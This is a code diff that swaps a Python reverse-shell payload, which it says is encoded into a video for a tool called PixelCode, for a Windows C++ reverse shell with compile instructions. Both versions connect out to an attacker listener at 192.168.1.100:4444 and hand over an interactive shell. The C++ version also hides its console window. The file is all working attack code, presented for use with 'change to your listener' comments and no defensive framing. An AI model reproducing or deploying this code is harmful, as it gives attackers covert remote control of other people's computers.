@@ -1,37 +1,62 @@
-#!/usr/bin/env python3
-"""
-Reverse Shell payload for PixelCode
-This is the actual payload that gets encoded into the video
-"""
+// reverse_shell.cpp - Windows Reverse Shell (x86/x64)
+// Compile with: x86_64-w64-mingw32-g++ -o reverse_shell.exe reverse_shell.cpp -lws2_32 -static -s
 
-import socket
-import subprocess
-import os
-import sys
-import threading
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#pragma comment(lib, "ws2_32.lib")
 
-def reverse_shell(host="192.168.1.100", port=4444):
-    """Simple reverse shell implementation"""
-    try:
-        # Create socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-        
-        # Redirect stdin/stdout/stderr to socket
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        
-        # Start interactive shell
-        subprocess.call(["/bin/sh" if os.name != "nt" else "cmd.exe"])
-        
-    except Exception as e:
-        print(f"Error: {e}")
-        sys.exit(1)
+int main() {
+    // Hide console window (optional)
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-if __name__ == "__main__":
-    # You can change these or get from environment
-    host = os.environ.get("C2_HOST", "192.168.1.100")
-    port = int(os.environ.get("C2_PORT", "4444"))
-    
-    reverse_shell(host, port)
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return 1;
+    }
+
+    // Create socket
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return 1;
+    }
+
+    // Set up server address (CHANGE THESE!)
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);                 // Change to your listener port
+    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Change to your listener IP
+
+    // Connect to listener
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    // Prepare STARTUPINFO to redirect stdin/stdout/stderr to socket
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+
+    // Launch cmd.exe with redirected handles
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+
+    // Wait for cmd.exe to exit
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Clean up
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    closesocket(sock);
+    WSACleanup();
+
+    return 0;
+}
